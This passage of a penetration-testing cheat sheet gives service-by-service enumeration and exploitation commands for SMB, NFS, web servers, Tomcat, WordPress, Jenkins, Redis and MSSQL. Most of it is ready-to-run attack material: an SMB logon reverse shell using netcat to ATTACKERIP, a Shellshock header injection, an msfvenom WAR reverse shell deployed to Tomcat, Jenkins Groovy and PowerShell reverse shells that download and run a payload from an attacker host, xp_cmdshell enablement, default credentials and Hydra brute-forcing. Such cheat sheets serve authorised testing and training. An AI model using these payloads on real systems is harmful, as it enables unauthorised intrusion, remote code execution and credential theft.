- Second field is the suffix - 00 (NetBIOS Node), 20 (SMB File Server), 01 (Browser, node that keeps track of NetBIOS names), 03 (Messenger, node or user that can receive popup notifications)
- Fifth field is node type
- Sixth field is node status - Active (Successfully registered the name), Permanent (Name doesnt expire)


```bash
nbtscan -rvh ${IP}
```

```text

```


#### Samba

**Protocol Information**

| Port | Protocol | Service                       |
| ---- | -------- | ----------------------------- |
| 139  | TCP      | NetBIOS Session Service, CIFS |
| 445  | TCP      | SMB Protocol, CIFS            |
| 3020 | TCP      | CIFS                          |
: Information about `SMB` services


**General Methodology**
> Run `nmap` to gather service specific information and vulnerability information.
> Enumerate for information about service, share, session, disks, users, etc.
> If `logon` command is available, check if `reverse shell` is possible.
> Download all files and analyze locally for any interesting information.
> Check if target is vulnerable to `EternalBlue`.
> Check if target is vulnerable to `symlink directory traversal`.
> If any valid creds are found previously, check if they can be reused.
> Check possibilities for generating custom wordlist for brute-forcing.


**References**
> `SMB` Version based on OS - http://woshub.com/smb-1-0-support-in-windows-server-2012-r2/
> https://kashz.gitbook.io/kashz-jewels/services/smb-exploits
> https://null-byte.wonderhowto.com/how-to/get-root-filesystem-access-via-samba-symlink-traversal-0198509/
> https://github.com/mikaelkall/HackingAllTheThings/tree/master/exploit/linux/remote/CVE-2010-0926_smb_symlink_traversal
> Extract `SMB` username and pwd from `TDB` files - https://suay.site/?p=2358
> `Samba 3.5.0 < 4.4.14/4.5.10/4.6.4` - `Sambacry` - https://github.com/opsxcq/exploit-CVE-2017-7494


**Enumeration**

Enumerate with `nmap nse` to find additional information.

```bash
sudo nmap -n -Pn -sT -T4 -p T:139,445,3020 --script "smb-enum-*,smb-server-stats,smb-system-info" -sV -oA recon/nmap-${IP}-tcp-smb ${IP}
```

```text

```


```bash
sudo nmap -n -Pn -sT -T4 -p T:139,445,3020 --script vuln -sV -oA recon/nmap-${IP}-tcp-smb-vuln ${IP}
```

```text

```


```bash
nbtscan -rvh ${IP}
```

```text

```


```bash
crackmapexec smb ${IP} -u '' -p '' --shares --sessions --disks --loggedon-users
```

```text

```


**Share Enumeration**

```bash
sudo smbmap -H ${IP}
```

```text

```


If protocol error happens, change `client min protocol` to `LANMAN1` in `/etc/samba/smb.conf`.

```bash
smbclient -N -L \\\\${IP}\\
```

```text

```


Enumerate all shares.

```bash
smbclient -N -L \\\\${IP} | grep Disk | sed 's/^\s*\(.*\)\s*Disk.*/\1/' | while read share ; do echo "======${share}======"; smbclient -N "//${IP}/${share}" -c dir ; echo ; done
```

```text

```


Enumerate individual shares. Use `prompt OFF` and `recurse ON`. Use `mask ""` and `mget *` to download all files.

```bash
SHARE="" ; smbclient -N \\\\${IP}\\${SHARE}
```

```text

```


If `logon` is available, try `reverse shell`.

```text
logon "./=`nohup nc -e /bin/bash ATTACKERIP 443`"
```


If credentials are known,

```bash
DOMAIN="" USER="" PASS="" ; smbclient -U ${DOMAIN}/${USER}%${PASS} -L \\\\${IP}\\
```


```bash
DOMAIN="" USER="" PASS="" SHARE="" ; smbmap -H ${IP} -d ${DOMAIN} -u ${USER} -p ${PASS} -s ${SHARE}
```

```text

```


**Permissions**

Find owner, perms and ACL for shares.

```bash
SHARE="" ITEM="" ; smbcacls -N \\\\${IP}\\${SHARE} /${ITEM}
```


**Download**

```bash
smbclient \\\\${IP}\\${SHARE} -N -c 'prompt OFF;recurse ON;mget *'
```

```bash
smbget -R smb://${IP}/${SHARE} --guest
```


**Mount**

Mount the share.

```bash
SHARE="" ; mkdir smb_mount ; sudo mount -t cifs //${IP}/${SHARE} smb_mount
```

```bash
DOMAIN="" USER="" PASS="" SHARE="" ; mkdir smb_mount ; sudo mount -t cifs //${IP}/${SHARE} smb_mount -o username=${USER},password=${PASS},domain=${DOMAIN}
```


**Enum4Linux**

```bash
${TOOLS_DIR}/smb/enum4linux-ng/enum4linux-ng.py -A -oA enum4linux-ng-${IP} ${IP}
```

```bash
${TOOLS_DIR}/smb/enum4linux-ng/enum4linux-ng.py -u "" -H "" -A -oA enum4linux-ng-${IP} ${IP}
```

*Findings*

- 


**Version Enumeration**

If `samba`version is not available till this point, use `smbver.sh` script. Download `smbver.sh` from https://github.com/rewardone/OSCPRepo/blob/master/scripts/recon_enum/smbver.sh and modify the path, if not available already.

```bash
sudo sh ${TOOLS_DIR}/smb/smbver.sh ${IP}
```

```text

```


Setup network tracing to detect `samba` version.

```bash
sudo ngrep -i -d tun0 's.?a.?m.?b.?a.*[[:digit:]]' & sudo smbmap -H ${IP}
```

```bash
sudo ngrep -i -d tun0 's.?a.?m.?b.?a.*[[:digit:]]' & sudo smbclient -N -L \\\\${IP}\\
```

```text

```


**Exploits**

- `< 3.0.24` symlink directory traversal - https://www.exploit-db.com/exploits/33599
- `Samba 3.0.20 < 3.0.25rc3` - Linux - username map script - https://www.exploit-db.com/exploits/16320
- `EternalBlue` - `Microsoft Windows 7/8.1/2008/2012/2016` - https://www.exploit-db.com/exploits/42315
- `Samba 3.5.0 < 4.4.14/4.5.10/4.6.4` - `Sambacry` - https://www.exploit-db.com/exploits/42084


**Brute-Force**

Check possibilities for generating custom wordlist using,
- `cewl`
- `wordhound`

Check for `brute-force` possibilities using,
- `Crackmapexec`
- `Hydra`


If credentials are known,

```bash
DOMAIN="" USER="" PASS="" HASH="" ; impacket-psexec -hashes ${DOMAIN}/${USER}:${PASS}@${IP} cmd
```

```bash
DOMAIN="" USER="" PASS="" HASH="" ; impacket-psexec -hashes ${HASH} ${DOMAIN}/${USER}@${IP} cmd
```


#### NFS

**General Methodology**
> Run `nmap` to gather service specific information and vulnerability information.
> Check if version or banner can be grabbed using `telnet` or `netcat`.
> Check the remote share accessibility, and if `root_squash` is permitted.
> Mount remote shares, and download all files and analyze locally for any interesting information.
> If any valid creds are found previously, check if they can be reused.
> Check possibilities for generating custom wordlist for brute-forcing.


**References**
> http://biowiki.org/wiki/index.php/Mounting_NFSThrough_SSHTunnel


**Enumeration**

Enumerate with `nmap nse` to find additional information.

```bash
sudo nmap -n -Pn -sT -T4 -p T:111,2049 --script "nfs-ls,nfs-showmount,nfs-statfs" -sV -oA recon/nmap-${IP}-tcp-nfs ${IP}
```

```text

```


Use `netcat` or `telnet` to connect and test commands. By default, `netcat` uses `LF` as line feed. To use `CR+LF` as line feed, use `-C` option.

```bash
nc -nv ${IP} 2049
```

```text

```


**Shares**

Use `showmount` to enumerate network shares.

```bash
showmount -e ${IP}
```

```text

```


```bash
showmount -a ${IP}
```

```text

```


```bash
showmount -d ${IP}
```

```text

```


**Mount**

Attempt to mount the remote file system.

```bash
PATH="" ; mkdir nfs-mount-path ; sudo mount -t nfs ${IP}:${PATH} ${PWD}/nfs-mount-path -vv
```

```bash
PATH="" ; mkdir nfs-mount-path ; sudo mount -o rw,vers=2 ${IP}:${PATH} ${PWD}/nfs-mount-path -vv
```

```text

```


```bash
ls -alR nfs-mount-path
```

```text

```


If access is not working, create a user with same `UID` and `GID` and check.

```bash
sudo useradd testnfs -u 1010
```


#### Web

**General Methodology**
> Check the website manually to find any interesting information.
> Check for default credentials if any known framework is found.
> If any login form is found,
> > Check for `authentication bypass` methods.
> > Check for `SQL Injection` possibilities.
> > Check for `error-based` username enumeration.
> > Check for possibility of social engineering attacks (`phishing`, `xss`, etc)
> Analyze the source code to find any interesting information.
> Use fuzzing tools (`wfuzz`, `ffuf`, `dirb`, `gobuster`, `feroxbuster`) to find files and directories.
> Check `authenticated scan`, `parameter scan`, `xss scan`, `post data scan` types in fuzzing.
> For `LFI` specific fuzzing, use `dotdotpwn`, `shellfire`.
> For `RFI` specific fuzzing, use `weevely`.
> If the target is `CMS`,
> > For `wordpress` based sites, use `wpscan`.
> > For `joomla` based sites, use `joomscan`.
> > For `drupal` based sites, use `droopescan`.
> > For `Webdav` based sites, use `davtest` and `cadaver`. Check if any authentication can be obtained.
> > Check for possibility of `file uploads`.
> > Check for possibility of creating new module/extension/addon etc, with malicious payload.
> > Check for sensitive database configuration or information.
> > Check for version/web server information.
> > Check for possibility of any `downgrade attacks`.
> > Check for presence of diagnostic tools - to identify `OS Command Injection` possibility.
> > Check for presence of scheduled jobs.
> Use `wappalyzer` or `whatweb` to find web technologies.
> Find basic info about the site using `curl`.
> Check hidden files and directories if `robots.txt` or `sitemap.xml` is available.
> Check if any interesting information can be obtained from title and links.
> Few web sites allow user registration. If there is no mail validation, new user can be registered and check for `IDOR` possibilities. If any contact information is found, use the `mail domain name` to register new user.
> Check if `403` pages can be accessed using by-pass methods.
> Check for vulnerabilities using `nikto`, `skipfish`.
> If the site contains `cgi-bin`, check for possibility of `shellshock` vulnerability.
> If the site has queries which navigate `XML` documents, check for `XPATH Injection` (`XML Path Language`) .
> If the site uses `php`, check if `phpinfo()` information can be dumped. Check for `disable_functions` and `open_basedir` setting values.
> If the site uses `ssl`, scan for enctyption information.
> Check version of framework or module from `README`, `changelog`, `version` files.
> Check for known exploits.
> If any valid creds are found previously, check if they can be reused.
> Check possibilities for generating custom wordlist for brute-forcing.


**References**
> https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass
> https://github.com/mubix/shellshocker-pocs
> https://www.troyhunt.com/everything-you-need-to-know-about2/


**Wordlists**

*General*
- /usr/share/wordlists/dirb/common.txt

*Web*
- /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-files.txt
- /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt
- /usr/share/wordlists/fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-medium-files.txt
- /usr/share/wordlists/fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-medium-directories.txt
- /usr/share/wordlists/SecLists/Discovery/Web-Content/quickhits.txt
- /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
- /usr/share/wordlists/SecLists/Discovery/Web-Content/Apache.fuzz.txt
- /usr/share/wordlists/SecLists/Discovery/Web-Content/tomcat.txt
- /usr/share/wordlists/SecLists/Discovery/Web-Content/CGIs.txt
- /usr/share/wordlists/SecLists/Discovery/Web-Content/IIS.fuzz.txt
- /usr/share/wordlists/SecLists/Discovery/Web-Content/PHP.fuzz.txt
- /usr/share/wordlists/SecLists/Discovery/Web-Content/CMS/wordpress.fuzz.txt
- /usr/share/wordlists/dirb/extensions_common.txt
- /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-extensions.txt
- /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt

*Usernames*
- /usr/share/wordlists/dirb/others/names.txt
- /usr/share/wordlists/SecLists/Usernames/Names/names.txt

*Passwords*
- /usr/share/wordlists/rockyou.txt
- /usr/share/wordlists/SecLists/Passwords/500-worst-passwords.txt
- /usr/share/wordlists/SecLists/Passwords/probable-v2-top1575.txt

*vHosts*
- /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt

*LFI*
- /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt


**Fuzzing for Pages and Directories**

*Using wfuzz*

Add `-p 127.0.0.1:9050:SOCKS5` if connecting via proxy. Add `-H "X-Forwarded-For: ${IP}"`, if target allows only whitelisted traffic.

```bash
PORT="80" SITE="http://${IP}:${PORT}/FUZZ" ; wfuzz --hl 0 --hc 404 -c -z file,/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-files.txt ${SITE}
```

```text

```


```bash
PORT="80" SITE="http://${IP}:${PORT}/FUZZ/" ; wfuzz --hl 0 --hc 404 -c -z file,/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt ${SITE}
```

```text

```


*Using ffuf*

Add `-x socks5://127.0.0.1:9050` if connecting via proxy. Add `-H "X-Forwarded-For: ${IP}"`, if target allows only whitelisted traffic.

```bash
PORT="80" LOC="" SITE="http://${IP}:${PORT}/FUZZ" ; ffuf -c -u ${SITE} -w /usr/share/wordlists/dirb/common.txt -e php,html,cgi,txt -o ${PWD}/ffuf-${IP}-${PORT}-${LOC}-common-files.txt
```

```text

```


```bash
PORT="80" LOC="" SITE="http://${IP}:${PORT}/FUZZ" ; ffuf -ic -c -u ${SITE} -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-files.txt -o ${PWD}/ffuf-${IP}-${PORT}-${LOC}-large-files.txt
```

```text

```


```bash
PORT="80" LOC="" SITE="http://${IP}:${PORT}/FUZZ/" ; ffuf -ic -c -u ${SITE} -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt -o ${PWD}/ffuf-${IP}-${PORT}-${LOC}-large-directories.txt
```

```text

```


*Using dirsearch*

```bash
PORT="80" SITE="http://${IP}:${PORT}" ; sudo dirsearch -t 20 -w /usr/share/wordlists/dirb/common.txt -u ${SITE} -e php,html -o ${PWD}/dirsearch-${IP}-${PORT}-common.txt
```

```text

```


**Basic Info about the Site**

Use `curl` to get basic info about the site. Use `-A "'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)')"` for setting search engine during request.

Use `-H "X-Forwarded-For: localhost"` or appropriate value in `curl` or use `Simple Modify Headers` firefox extendion to change the request header, if required.


```bash
SITE="http://${IP}" ; whatweb ${SITE}
```

```text

```


```bash
curl -s ${SITE} | html2text
```

```text

```


Check `robots.txt` and `sitemap.xml`.

```bash
curl -s ${SITE}/robots.txt
```

```bash
curl -s ${SITE}/http-robots.txt
```

```text

```

```bash
curl -s ${SITE}/sitemap.xml | xmllint --format -
```

```text

```


Check title and links for additional information.

```bash
curl -sIL ${SITE}
```

```text

```


```bash
curl -sL ${SITE} | grep "title\|href" | sed -e 's/^[[:space:]]*//'
```

```text

```


**Vulnerabilities in Site**

```bash
SITE=${IP} PORT="80" ; sudo nikto -host http://${SITE}:${PORT} -C all -Format txt -output nikto-${IP}.txt -ask no -evasion 1
```

```text

```


**ShellShock**

If `cgi-bin` is found, check for `shellshock` vulnerability.

```bash
NS="" ; sudo nmap -n -Pn -T4 -sS -p T:80,443,8080,8443 --script http-shellshock --script-args "uri=/cgi-bin/bin,cmd=cat /etc/passwd" --dns-servers ${NS} -oA recon/nmap-${IP}-shellshock ${IP} 2>/dev/null
```

```text

```


```bash
cmd="hostname;id;pwd;ip a|grep -w inet;uname -a;cat /etc/issue;set" SITE="http://${IP}" ; curl -s -H "User-Agent: () { :; }; /bin/bash -c 'echo aaaa;${cmd};echo zzzz'" ${SITE} | sed -n '/aaaa/{:a;n;/zzzz/b;p;ba}'
```

```text

```


**SSL test**

If the site contains `https`, scan for its encryption details. If connection is not allowed, change `MinProtocol` to `None` in `/etc/ssl/openssl.cnf`.

```bash
sslscan ${IP}
```

```text

```


**Exploits**

*IIS*
https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269
https://www.exploit-db.com/exploits/41738


**Brute-Force**

Check possibilities for generating custom wordlist using,
- `cewl`
- `wordhound`

Check for `brute-force` possibilities using,
- `Hydra`

```bash
cewl ${SITE} -m 6 -w cewl-${IP}.txt
```


#### Apache Tomcat

**General Methodology**
> Check version of `Tomcat`.
> Check default credentials from https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown.
> Perform `file` and `directory` fuzzing.
> For `mod_ssl < 2.8.7`, check exploit POC https://github.com/heltonWernik/OpenLuck.
> If any valid creds are found previously, check if they can be reused.
> Check possibilities for generating custom wordlist for brute-forcing.
> Check default credentials from location /usr/share/wordlists/SecLists/Passwords/Default-Credentials.


**Version Enumeration**

Check Version, if `nmap` did not find out.

```bash
SITE="http://${IP}:8080/docs/" ; curl -s ${SITE} | grep "Tomcat [0-9]"
```


**General Information**

Default credentials.
- `tomcat` - `tomcat`
- `tomcat` - `s3cret`

Fuzzing Wordlists.
- `/usr/share/wordlists/SecLists/Discovery/Web-Content/ApacheTomcat.fuzz.txt`
- `/usr/share/wordlists/fuzzdb/discovery/predictable-filepaths/webservers-appservers/ApacheTomcat.txt`

Brute-force Wordlists.
- `/usr/share/wordlists/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt`
- `/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt`
- `/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_userpass.txt`

Interesting paths.
- `/manager/`
- `/manager/status`
- `/host-manager/`


**Fuzzing**

Add `-p socks5://127.0.0.1:9050` if connecting via proxy.

```bash
SITE="http://${IP}:8080/FUZZ" ; wfuzz --hl 0 --hc 404 -c -z file,/usr/share/wordlists/SecLists/Discovery/Web-Content/tomcat.txt ${SITE}
```

```text

```


**Brute-force**


```bash
hydra -I -C /usr/share/wordlists/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt -f ${IP} -s 8080 http-get /manager/html
```

```text

```


**Other App Actions**

*List Applications*

```bash
USER="" PASS="" ; curl -u ${USER}:${PASS} http://${IP}:8080/manager/text/list
```


*Deploy Application*

```bash
LH=ATTACKERIP LP="" ; msfvenom -p java/jsp_shell_reverse_tcp LHOST=${LH} LPORT=${LP} -f war -o payload.war
```

```bash
USER="" PASS="" ; curl -u ${USER}:${PASS} http://${IP}:8080/manager/text/deploy?path=/payload -T payload.war
```

Deploying without creds,
- Copy `payload.war` to `%CATALINA_HOME%\webapps\shell.war`
- Run `%CATALINA_HOME%\bin\startup.bat`
- Invoke using `curl http://${IP}:8080/payload/`


*Undeploy Application*

```bash
USER="" PASS="" ; curl -u ${USER}:${PASS} http://${IP}:8080/manager/text/undeploy?path=/payload
```


#### Wordpress

**General Methodology**
> Enumerate `wordpress` to find information about plugins, users and themes.
> Check default credentials from location /usr/share/wordlists/SecLists/Passwords/Default-Credentials.
> Check for well-known exploit POCs.
> If any valid creds are found previously, check if they can be reused.


**Tips**
> If `database` access is obtained, create an admin user https://www.wpbeginner.com/wp-tutorials/how-to-add-an-admin-user-to-the-wordpress-database-via-mysql/.
> Use https://www.useotools.com/wordpress-password-hash-generator to generate hash.


**General Information**

Interesting paths.
*Login Page*
- `/wp-login.php`
- `/wp-admin/`
*Themes*
- `/wp-content/themes/<>/404.php`
*Plugins*
- `/wp-content/plugins/<>/`
*Config*
- `/wp-config.php`
*Site Health*
- `/wp-admin/site-health.php?tab=debug`


**Enumeration**

If `username` or `api-token` is known, use in options `--username` or `--api-token`.

```bash
SITE="" ; wpscan --url ${SITE} --disable-tls-checks --max-threads 20 --enumerate t,u --format cli --no-banner --output wordpress-${IP}-themes-users.txt
```

```text

```


```bash
SITE="" ; wpscan --url ${SITE} --disable-tls-checks --max-threads 20 --enumerate p --format cli --no-banner --output wordpress-${IP}-plugins.txt
```

```text

```


**Exploits**

- Plugin - https://kashz.gitbook.io/kashz-jewels/services/wordpress-plugin-exploits


#### Laravel

**General Information**

Interesting paths.
- `<app-name>/storage/logs/laravel.log`


**Exploits**

- https://github.com/nth347/CVE-2021-3129_exploit
- https://github.com/zhzyker/CVE-2021-3129


#### Jenkins

**General Methodology**
> Check default credentials from location /usr/share/wordlists/SecLists/Passwords/Default-Credentials.
> Once authenticated, gain shell using appropriate method mentioned below.
> If any valid creds are found previously, check if they can be reused.


**References**
> https://kashz.gitbook.io/kashz-jewels/cheatsheet/jenkins


**General Information**

Default credentials.
- `admin` - `password`
- `jenkins` - `jenkins`

Password file in `Windows`.
- `C:\Users\Administrator\.jenkins\secrets\initialAdminPassword`

Version check.
- `/oops`
- `/err`

List users (without creds).
- `/people`
- `/asynchPeople`
- `/securityRealm/user/admin/search/index?q=USERNAME`


**Gaining Shell**

`Manage Jenkins` - `Script Console`

*Generic*

```text
String host="IP";
int port=6969;
String cmd="/bin/bash";
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start() ; Socket s=new Socket(host,port) ; InputStream pi=p.getInputStream(), pe=p.getErrorStream(), si=s.getInputStream() ; OutputStream po=p.getOutputStream(), so=s.getOutputStream() ; while(!s.isClosed()) {while(pi.available()>0) so.write(pi.read()) ; while(pe.available()>0) so.write(pe.read()) ; while(si.available()>0) po.write(si.read()) ; so.flush() ; po.flush() ; Thread.sleep(50) ; try {p.exitValue() ; break;} catch (Exception e){}} ; p.destroy() ; s.close();
```

*Windows*

```text
cmd = """ powershell -nop -ep bypass -c "iex ( (New-Object Net.WebClient).DownloadString('http://ATTACKERIP/tools/Invoke-PowerShellTcp.ps1') ) ; Invoke-PowerShellTcp -Reverse -IPAddress ATTACKERIP -Port " """
println cmd.execute().text
```

*Linux*

```text
r = Runtime.getRuntime()
p = r.exec(["/bin/bash", "-c", "exec 5<>/dev/tcp/IP/PORT ; cat <&5 | while read line ; do \$line 2>&5 >&5 ; done"] as String[])
p.waitFor()
```


*New Project method*

`New Item` > `Freestyle Project` > `Build` > `Add Build Step` > `Execute Windows Batch Command`

```text
powershell -nop -ep bypass -c "iex ( (New-Object Net.WebClient).DownloadString('http://ATTACKERIP/tools/Invoke-PowerShellTcp.ps1') ) ; Invoke-PowerShellTcp -Reverse -IPAddress ATTACKERIP -Port "
```


#### WebDav

**General Methodology**
> Enumerate `webdav` to find information and check if its writable.
> If any valid creds are found previously, check if they can be reused.


**References**
https://book.hacktricks.xyz/pentesting/pentesting-web/put-method-webdav


**General Information**

Interesting files.
- `.htpasswd`
- `passwd.dav`

Check in the paths,
- `/etc/apache2`
- `/var/www`
- `/var/www/html`
- `/var/www/html/*/webdav`


**Enumeration**

```bash
SITE="" ; davtest -url ${SITE} -cleanup -auth test1:test1 -nocreate
```

```text

```


#### Apache JServ

**General Methodology**
> Run `nmap` to gather service specific information and vulnerability information.
> Check for `GhostCat` vulnerability from exploit POC (https://www.exploit-db.com/exploits/48143.
> If any valid creds are found previously, check if they can be reused.


**Enumeration**

Enumerate with `nmap nse` to find additional information.

```bash
sudo nmap -n -Pn -sT -T4 -p T:8009 --script "ajp-auth,ajp-headers,ajp-methods,ajp-request" -sV -oA recon/nmap-${IP}-tcp-ajp ${IP}
```

```text

```


#### Ident

**Enumeration**

By default, nmap script scan will identify user when `ident` is running along with `smb`.

```bash
nc -nvC ${IP} 113
```

```text
445,43218
22,12
```

```text

```


```bash
ident-user-enum ${IP} 22 113 139 445
```

```text

```


#### Telnet

**General Methodology**
> Run `nmap` to gather service specific information and vulnerability information.
> Check if version or banner can be grabbed using `telnet` or `netcat`.


**Enumeration**

Enumerate with `nmap nse` to find additional information.

```bash
sudo nmap -n -Pn -sT -T4 -p T:23 --script "telnet-ntlm-info,telnet-encryption" -sV -oA recon/nmap-${IP}-tcp-telnet ${IP}
```

```text

```


Use `netcat` or `telnet` to connect and test commands. By default, `netcat` uses `LF` as line feed. To use `CR+LF` as line feed, use `-C` option.

```bash
nc -nv ${IP} 23
```

```text

```


**General Information**

Interesting paths.
- `/etc/inetd.conf`
- `/etc/xinetd.d/telnet`
- `/etc/xinetd.d/stelnet`


#### SNMP (UDP)

**General Methodology**
> Run `nmap` to gather service specific information and vulnerability information.
> Run `snmp` scanners to gather OS specific information.


**Enumeration**

Enumerate with `nmap nse` to find additional information.

```bash
sudo nmap -n -Pn -sT -sU -T4 -p T:161,162,199,U:161,162 --script "snmp-info,snmp-interfaces,snmp-netstat,snmp-processes,snmp-sysdescr,snmp-win32-services,snmp-win32-shares,snmp-win32-software,snmp-win32-users" -sV -oA recon/nmap-${IP}-tcp-snmp ${IP}
```

```text

```


**SNMP Scanner**

```bash
onesixtyone -c /usr/share/wordlists/fuzzdb/wordlists-misc/wordlist-common-snmp-community-strings.txt ${IP}
```

```text

```


```bash
snmp-check -w ${IP}
```

```text

```


**Extended query**

```bash
snmpwalk -v1 -c public ${IP} NET-SNMP-EXTEND-MIB::nsExtendOutputFull
```

```text

```


#### DNS

**General Methodology**
> Run `nmap` to gather service specific information and vulnerability information.
> Query for `DNS` records.
> Check if zone information can be transferred.


**Enumeration**

Enumerate with `nmap nse` to find additional information.

```bash
sudo nmap -n -Pn -sT -sU -T4 -p T:53,853,5353,U:53,5353 --script "dns-nsid,dns-recursion,dns-service-discovery,dns-zone-transfer,dns-srv-enum" -sV -oA recon/nmap-${IP}-tcp-dns ${IP}
```

```text

```


**Query Records**

```bash
NS="" ; host ${IP} ${NS}

host -t mx ${IP} ${NS}
host -t txt ${IP} ${NS}
```

```text

```


```bash
DOMAIN="" SUB="" NS="" ; dig +nocmd +nocomments NS ${DOMAIN}

dig +nocmd +nocomments AXFR @${SUB}.${DOMAIN}. ${DOMAIN}
dig +nocmd +nocomments AXFR @${IP} ${DOMAIN}

dig +nocmd +nocomments +trace NS ${NS}

dig version.bind CHAOS TXT @${NS}

dig @${IP} -x ${IP}
```

```text

```


```bash
NS="" DOMAIN="" ; dnsrecon -d ${DOMAIN} -t axfr -n ${NS}

dnsrecon -d ${DOMAIN} -D subdomain-list.txt -t brt

dnsrecon -d ${DOMAIN} -r ${IP} -n ${NS}
```

```text

```


If Windows system joined in domain,

```bash
DOMAIN="" ; dnscmd /zoneexport ${DOMAIN} ${DOMAIN}.txt
```

```cmd
powershell -c "get-dnsserverzone"
powershell -c "get-dnsserverresourcerecord  | ft -wrap"
```

```text

```


#### Redis

**General Methodology**
> Run `nmap` to gather service specific information and vulnerability information.
> Check possibilities for generating custom wordlist for brute-forcing.
> If any valid creds are found previously, check if they can be reused.
> Check `hacktricks` `RCE` methods to combine other available system resources to get `initial shell`.


**References**
> https://lzone.de/cheat-sheet/Redis
> https://redis.io/docs/data-types/tutorial/
> https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#redis-rce


**Config Files**
- `/etc/redis/redis.conf`


**Enumeration**

Enumerate with `nmap nse` to find additional information.

```bash
sudo nmap -n -Pn -sT -T4 -p T:6379 --script "redis-info" -sV -oA recon/nmap-${IP}-tcp-redis ${IP}
```

```text

```


Use `netcat` or `telnet` to connect and test commands. By default, `netcat` uses `LF` as line feed. To use `CR+LF` as line feed, use `-C` option.

```bash
nc -nv ${IP} 6379
```

Commands to enumerate `Redis` server.

```text
AUTH <user> <pass>

INFO

CONFIG GET *

MONITOR

SELECT 1

KEYS
KEYS "*"

GET <key>

EXIT
```

```text

```


```bash
redis-cli -h ${IP}
```

```text

```


Dump contents of `redis` database. Setup `redis-dump` from https://www.npmjs.com/package/redis-dump, if not available already.

```bash
redis-dump -h ${IP} -f '*' --json
```

```text

```


**Brute-Force**

Check possibilities for generating custom wordlist using,
- `cewl`
- `wordhound`

Check for `brute-force` possibilities using,
- `Crackmapexec`
- `Hydra`
- `Patator`
- `Crowbar`


```bash
hydra -I -P /usr/share/wordlists/rockyou.txt ${IP} -t 20 redis
```

```text

```


#### DB (MSSQL)

**General Methodology**
> Run `nmap` to gather service specific information and vulnerability information.
> Enumerate for service information.
> If login is available, login and enumerate table data.
> If `xp_cmdshell` is enabled, OS commands can be run.
> If any valid creds are found previously, check if they can be reused.
> Check possibilities for generating custom wordlist for brute-forcing.


**References**
> Extracting data from `mdf` file - https://blog.xpnsec.com/extracting-master-mdf-hashes/
> Extracting data from `mdf` file - https://docs.h4rithd.com/database/mssql-mysql#01.-ms-sql
> https://learn.microsoft.com/en-us/sql/sql-server/install/file-locations-for-default-and-named-instances-of-sql-server?view=sql-server-ver16
> https://www.sqlserverlogexplorer.com/how-to-find-mdf-file-location-in-sql-server/
> https://practicalsbs.wordpress.com/2016/07/03/sql-server-file-locations-for-default-instances/


**Enumeration**

Enumerate with `nmap nse` to find additional information.

```bash
sudo nmap -n -Pn -sT -sU -T4 -p T:1433,1434,5022,27900,U:1434 --script "ms-sql-info,ms-sql-empty-password,ms-sql-ntlm-info,ms-sql-hasdbaccess" --script-args mssql.username=sa,mssql.password=sa,mssql.instance-name=MSSQLSERVER -sV -oA recon/nmap-${IP}-tcp-mssql ${IP}
```

Replace password with `blank` or other password, and replace instance name as `SQLEXPRESS` or other db instances, if required.

```text

```


```bash
crackmapexec mssql ${IP}
```

```text

```


**Access**

If credentials are known,

```bash
USER="" PASS="" ; impacket-mssqlclient ${USER}:${PASS}@${IP} -windows-auth
```

```text

```

Commands to enumerate database.

```text
select @@version;
select user_name();

enable_xp_cmdshell

sp_configure 'Show Advanced Options', 1
reconfigure
sp_configure 'xp_cmdshell', 1
reconfigure

select name, convert(int, isnull(value, value_in_use)) as isconfigured from sys.configurations where name = 'xp_cmdshell';

exec xp_cmdshell 'whoami'
```


If `xp_cmdshell` is enabled, `nmap` can be used to run system commands.

```bash
sudo nmap -n -Pn -p T:1433 --script "ms-sql-xp-cmdshell" --script-args mssql.username=sa,mssql.password="",ms-sql-xp-cmdshell.cmd="" -oA recon/nmap-${IP}-tcp-mssql-xp-cmdshell ${IP}
```

```text

```


**Brute-Force**

Check possibilities for generating custom wordlist using,
- `cewl`
- `wordhound`

Check for `brute-force` possibilities using,
- `Crackmapexec`


**General Information**

Location of important files in `MSSQL`.
- Data Location - `C:\Program Files\Microsoft SQL Server\SQL-VERSION\MSSQL\DATA`
- Backup Location - `C:\Program Files\Microsoft SQL Server\SQL-VERSION\MSSQL\BACKUP`

| DB                        | SQL-VERSION         |
| ------------------------- | ------------------- |
| SQL Server 2012 (Full)    | MSSQL11.MSSQLSERVER |
| SQL Server 2012 (Express) | MSSQL11.SQLEXPRESS  |
| SQL Server 2014 (Full)    | MSSQL12.MSSQLSERVER |
| SQL Server 2014 (Express) | MSSQL12.SQLEXPRESS  | 
| SQL Server 2016 (Full)    | MSSQL13.MSSQLSERVER |
| SQL Server 2016 (Express) | MSSQL13.SQLEXPRESS  |
| SQL Server 2017 (Full)    | MSSQL14.MSSQLSERVER |
| SQL Server 2017 (Express) | MSSQL14.SQLEXPRESS  |
| SQL Server 2019 (Full)    | MSSQL15.MSSQLSERVER |
| SQL Server 2019 (Express) | MSSQL15.SQLEXPRESS  |
: String to be replaced for `SQL-VERSION`.


#### DB (MySQL/MariaDB)
